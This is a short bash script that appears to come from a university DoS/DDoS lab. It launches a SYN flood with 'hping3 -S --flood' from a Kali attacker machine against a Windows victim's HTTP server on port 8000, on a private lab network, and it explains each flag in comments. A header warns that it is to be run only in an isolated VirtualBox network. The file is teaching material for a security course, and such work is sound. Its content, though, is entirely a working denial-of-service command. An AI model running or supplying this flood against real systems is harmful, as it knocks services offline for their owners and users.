#!/bin/bash
# ==============================================================
# SYN Flood simulation — CMU-CS 376 DoS/DDoS Lab
# RUN ON: Kali Linux (Attacker) — 192.168.100.10
# TARGET: Windows (Victim) — 192.168.100.20:8000
#
# WARNING: Run only inside an isolated VirtualBox Internal Network
# ("intnet-lab"). Do not use outside of an academic lab context.
# ==============================================================

TARGET_IP="192.168.100.20"
TARGET_PORT=8000

echo "[*] Starting SYN Flood against ${TARGET_IP}:${TARGET_PORT}"
echo "[*] Press Ctrl+C to stop"

# -S     : send packets with the SYN flag set (initiates the TCP
#          handshake without completing it)
# -p     : destination port (8000 — the port of the Python HTTP
#          Server running on the victim machine)
# --flood: send packets at the maximum possible rate, without
#          waiting for replies
sudo hping3 -S -p ${TARGET_PORT} --flood ${TARGET_IP}
